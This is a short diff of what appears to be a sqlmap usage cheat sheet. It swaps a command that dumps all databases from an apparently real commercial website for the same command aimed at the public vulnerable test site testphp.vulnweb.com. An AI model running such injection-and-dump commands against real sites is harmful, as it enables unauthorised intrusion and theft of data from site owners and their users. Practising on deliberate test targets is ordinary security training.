@@ -8,7 +8,7 @@
 
     sqlmap -u "http://testphp.vulnweb.com/" --crawl 3 --batch --threads 5 --random-agent --risk 1 --level 1
 
-    sqlmap -u "http://www.minasca.com.br/single-produtos.php?id=23" --dump-all --batch --threads 7
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump-all --batch --threads 7
 
 # Step by step dumping databases
 
